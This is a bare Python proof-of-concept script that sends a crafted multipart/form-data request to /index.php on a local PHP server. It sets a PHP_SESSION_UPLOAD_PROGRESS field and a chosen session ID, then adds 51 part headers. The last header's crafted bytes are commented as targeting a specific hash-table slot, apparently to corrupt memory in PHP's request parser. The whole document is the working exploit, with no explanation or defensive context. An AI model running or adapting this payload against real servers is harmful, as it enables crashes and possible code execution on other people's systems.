#!/usr/bin/env python3
import socket, struct, sys
HOST='127.0.0.1'; PORT=8088
BND=b'BBBBB'
HDRS=[]
for i in range(50):
    HDRS.append((b'X', b'A'))
HDRS.append((b'\x18\x30AAAAA', b'V'))  # 51st key at slot101, 7 bytes + NUL
parts=[]
parts.append(('PHPSESSID', b'attacksessionid0001', None))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn', None))
parts.append(('lastfield9', b'Z'*55, None))
o=bytearray()
for name,data,fn in parts:
    o+=b'--'+BND+b'\r\n'
    o+=b'Content-Disposition: form-data; name="'+name.encode()+b'"\r\n'
    if name=='lastfield9':
        for k,v in HDRS:
            o+=k+b': '+v+b'\r\n'
    o+=b'\r\n'+data+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
